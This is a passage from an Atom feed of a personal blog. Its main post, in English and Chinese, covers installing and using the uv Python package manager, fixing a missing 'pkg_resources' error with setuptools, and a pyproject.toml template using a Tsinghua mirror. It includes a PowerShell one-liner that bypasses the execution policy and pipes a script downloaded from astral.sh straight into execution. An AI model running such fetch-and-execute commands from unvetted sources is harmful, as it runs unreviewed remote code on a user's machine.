&lt;p&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;radekmaziarka.pl&#x2F;2021&#x2F;03&#x2F;14&#x2F;conways-law-how-organizations-structure-influences-its-results&#x2F;&quot;&gt;Conway’s Law - how organization’s structure influences its results&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Conway%27s_law&quot;&gt;Conway’s law &lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;hankmo.com&#x2F;posts&#x2F;architecture&#x2F;microservice-conways-law&#x2F;#_%E7%AC%AC%E4%B8%80%E5%AE%9A%E5%BE%8B%E4%BA%BA%E6%98%AF%E5%A4%8D%E6%9D%82%E7%A4%BE%E4%BC%9A%E5%8A%A8%E7%89%A9&quot;&gt;微服务架构的理论基础 - 康威定律&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;opensourceway.community&#x2F;posts&#x2F;community_leadership_development&#x2F;how_kubernetes_community_works_2&#x2F;&quot;&gt;Kubernetes 社区是如何运作的系列之二——康威定律和SIG&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;https:&#x2F;&#x2F;github.com&#x2F;lbsucceed&#x2F;nonebot-plugin-track-anime&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
	</entry>
	<entry xml:lang="zh">
		<title>uv再体验</title>
		<published>2025-01-27T00:00:00+00:00</published>
		<updated>2025-02-21T00:00:00+00:00</updated>
		<link href="https://lbsucceed.github.io/posts/uvzai-ti-yan/" type="text/html"/>
		<id>https://lbsucceed.github.io/posts/uvzai-ti-yan/</id>
		<content type="html">&lt;p&gt;&lt;img src=&quot;&#x2F;imgs&#x2F;%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.assets&#x2F;api.php&quot; alt=&quot;随机动漫图片&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;uv-usage&quot;&gt;UV usage&lt;a class=&quot;zola-anchor&quot; href=&quot;#uv-usage&quot; aria-label=&quot;Anchor link for: uv-usage&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;I have wrote an article on Jan.18.2025 .In that article I thought uv is not a useful tool as I thought. However, here in this time I will say “Nothing is better than UV”.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;uv-is-all-you-need&quot;&gt;UV is all you need&lt;a class=&quot;zola-anchor&quot; href=&quot;#uv-is-all-you-need&quot; aria-label=&quot;Anchor link for: uv-is-all-you-need&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;install-uninstall&quot;&gt;Install &amp;amp; Uninstall&lt;a class=&quot;zola-anchor&quot; href=&quot;#install-uninstall&quot; aria-label=&quot;Anchor link for: install-uninstall&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;In windows, we can download and install uv with a standalone installer.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; class=&quot;language-shell z-code&quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;powershell -ExecutionPolicy ByPass -c &amp;quot;irm https:&#x2F;&#x2F;astral.sh&#x2F;uv&#x2F;install.ps1 | iex&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;div style=&quot;padding: 15px; border: 1px solid transparent; border-color: transparent; margin-bottom: 20px; border-radius: 4px; color: #8a6d3b;; background-color: #fcf8e3; border-color: #faebcc;&quot;&gt;
&amp;#x1F628&lt;b&gt; Watchout：When you try to instal in this method, adding uv bin in you environment path such as:`C:\Users\HP\.local\bin` in windows&lt;&#x2F;b&gt;
&lt;&#x2F;div&gt;
&lt;p&gt;Then you can use it anywhere.&lt;&#x2F;p&gt;
&lt;p&gt;When uv is installed via the standalone installer, it can update itself on-demand:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; class=&quot;language-shell z-code&quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;uv self update
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;You can use&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; class=&quot;language-shell z-code&quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ uv pip install torch torchvision torchaudio --index-url https:&#x2F;&#x2F;download.pytorch.org&#x2F;whl&#x2F;cpu
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;install stable, CPU-only PyTorch on Windows.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;上面的方式并不可行。&lt;&#x2F;p&gt;
&lt;p&gt;建议还是使用官方建议的操作进行食用。&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;astral-sh&#x2F;uv&#x2F;issues&#x2F;8344#issuecomment-2426120753&quot;&gt;参考issue&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;modulenotfounderror-no-module-named-pkg-resources&quot;&gt;ModuleNotFoundError: No module named ‘pkg_resources’&lt;a class=&quot;zola-anchor&quot; href=&quot;#modulenotfounderror-no-module-named-pkg-resources&quot; aria-label=&quot;Anchor link for: modulenotfounderror-no-module-named-pkg-resources&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;这个问题并不会出现在conda中，但却在uv使用的时候出现了，并且在经历了一个劲的钻牛角尖后我终于知道并不是安装包的问题了，而是缺少一个依赖，setuptools,我猜测可能是我将makeupsafe降级了之后这个安装包受损导致的。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; class=&quot;language-shell z-code&quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(xpu-test) root@DESKTOP-SN2FD5H:~&#x2F;xpu_test# python -c &amp;quot;import torch; import intel_extension_for_pytorch as ipex; print(torch.__version__); print(ipex.__version__);&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Traceback (most recent call last):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  File &amp;quot;&amp;lt;string&amp;gt;&amp;quot;, line 1, in &amp;lt;module&amp;gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  File &amp;quot;&#x2F;root&#x2F;xpu_test&#x2F;.venv&#x2F;lib&#x2F;python3.11&#x2F;site-packages&#x2F;intel_extension_for_pytorch&#x2F;__init__.py&amp;quot;, line 120, in &amp;lt;module&amp;gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    from . import llm
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  File &amp;quot;&#x2F;root&#x2F;xpu_test&#x2F;.venv&#x2F;lib&#x2F;python3.11&#x2F;site-packages&#x2F;intel_extension_for_pytorch&#x2F;llm&#x2F;__init__.py&amp;quot;, line 2, in &amp;lt;module&amp;gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    from .frontend import optimize
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  File &amp;quot;&#x2F;root&#x2F;xpu_test&#x2F;.venv&#x2F;lib&#x2F;python3.11&#x2F;site-packages&#x2F;intel_extension_for_pytorch&#x2F;llm&#x2F;frontend.py&amp;quot;, line 1, in &amp;lt;module&amp;gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    from intel_extension_for_pytorch.transformers.optimize import optimize
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  File &amp;quot;&#x2F;root&#x2F;xpu_test&#x2F;.venv&#x2F;lib&#x2F;python3.11&#x2F;site-packages&#x2F;intel_extension_for_pytorch&#x2F;transformers&#x2F;__init__.py&amp;quot;, line 1, in &amp;lt;module&amp;gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    from .optimize import optimize_transformers
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  File &amp;quot;&#x2F;root&#x2F;xpu_test&#x2F;.venv&#x2F;lib&#x2F;python3.11&#x2F;site-packages&#x2F;intel_extension_for_pytorch&#x2F;transformers&#x2F;optimize.py&amp;quot;, line 4, in &amp;lt;module&amp;gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    import pkg_resources
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ModuleNotFoundError: No module named &amp;#39;pkg_resources&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(xpu-test) root@DESKTOP-SN2FD5H:~&#x2F;xpu_test# uv add pkg_resources
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  × No solution found when resolving dependencies for split ((python_full_version &amp;gt;= &amp;#39;3.12&amp;#39; and platform_machine != &amp;#39;aarch64&amp;#39; and sys_platform == &amp;#39;linux&amp;#39;) or
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  │ (python_full_version &amp;gt;= &amp;#39;3.12&amp;#39; and sys_platform != &amp;#39;darwin&amp;#39; and sys_platform != &amp;#39;linux&amp;#39;)):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  ╰─▶ Because there are no versions of pkg-resources and your project depends on pkg-resources, we can conclude that your project&amp;#39;s requirements are unsatisfiable.
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  help: If you want to add the package regardless of the failed resolution, provide the `--frozen` flag to skip locking and syncing.
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(xpu-test) root@DESKTOP-SN2FD5H:~&#x2F;xpu_test# uv pip install pkg_resources
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  × No solution found when resolving dependencies:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  ╰─▶ Because there are no versions of pkg-resources and you require pkg-resources, we can conclude that your requirements are unsatisfiable.
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(xpu-test) root@DESKTOP-SN2FD5H:~&#x2F;xpu_test# uv add setuptools
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Resolved 21 packages in 6.23s
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Prepared 1 package in 9.65s
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Installed 1 package in 48ms
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt; + setuptools==70.2.0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(xpu-test) root@DESKTOP-SN2FD5H:~&#x2F;xpu_test# python -c &amp;quot;import torch; import intel_extension_for_pytorch as ipex; print(torch.__version__); print(ipex.__version__);&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;2.5.0+cpu
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;2.5.0+cpu
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;还有一个简单的测试安装是否成功的脚本&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash z-code&quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;z-source z-shell z-bash&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-compound z-begin z-shell&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-shell&quot;&gt;&lt;span class=&quot;z-variable z-function z-shell&quot;&gt;xpu-test&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-compound z-end z-shell&quot;&gt;)&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-shell&quot;&gt; root@DESKTOP-SN2FD5H:&lt;span class=&quot;z-meta z-group z-expansion z-tilde&quot;&gt;&lt;span class=&quot;z-variable z-language z-tilde z-shell&quot;&gt;~&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&#x2F;xpu_test# python&lt;span class=&quot;z-variable z-parameter z-option z-shell&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-parameter z-shell&quot;&gt; -&lt;&#x2F;span&gt;c&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-double z-shell&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-shell&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;import torch; import intel_extension_for_pytorch as ipex; print(torch.__version__); print(ipex.__version__);&lt;span class=&quot;z-punctuation z-definition z-string z-end z-shell&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-shell z-bash&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-shell&quot;&gt;&lt;span class=&quot;z-variable z-function z-shell&quot;&gt;2.5.0+cpu&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-shell z-bash&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-shell&quot;&gt;&lt;span class=&quot;z-variable z-function z-shell&quot;&gt;2.5.0+cpu&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;下面是我以后的安装模板，其中pytorch的安装源可能要换成cuda版本。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;toml&quot; class=&quot;language-toml z-code&quot;&gt;&lt;code class=&quot;language-toml&quot; data-lang=&quot;toml&quot;&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-table z-begin z-toml&quot;&gt;[&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-tag z-table z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-table z-toml&quot;&gt;project&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-table z-end z-toml&quot;&gt;]&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;name&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;xpu-test&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;version&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;0.1.0&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;description&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;Add your description here&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;readme&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;README.md&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;requires-python&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&amp;gt;=3.11&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;dependencies&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-array z-begin z-toml&quot;&gt;[&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;    &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;intel-extension-for-pytorch==2.5.0&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-array z-toml&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;    &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;markupsafe==2.1.3&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-array z-toml&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;    &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;medpy&amp;gt;=0.5.2&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-array z-toml&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;    &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;oneccl-bind-pt==2.5.0&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-array z-toml&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;    &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;opencv-python&amp;gt;=4.11.0.86&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-array z-toml&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;    &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;setuptools&amp;gt;=70.2.0&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-array z-toml&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;    &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;tensorboard&amp;gt;=2.18.0&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-array z-toml&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;    &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;torch==2.5.0&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-array z-toml&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;    &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;torchaudio==2.5.0&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-array z-toml&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;    &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;torchvision==0.20.0&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-array z-toml&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;    &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;yacs&amp;gt;=0.1.8&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-array z-toml&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-array z-end z-toml&quot;&gt;]&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-comment z-line z-number-sign z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-toml&quot;&gt;#&lt;&#x2F;span&gt; 换源以及加上软链接，这个是非常必要的，防止占用空间。。。&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-table z-begin z-toml&quot;&gt;[&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-tag z-table z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-table z-toml&quot;&gt;tool&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-table z-toml&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-table z-toml&quot;&gt;uv&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-table z-end z-toml&quot;&gt;]&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;link-mode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;symlink&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;index-url&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-comment z-line z-number-sign z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-toml&quot;&gt;#&lt;&#x2F;span&gt; UV官方文档所建议的安装程序。&lt;&#x2F;span&gt;
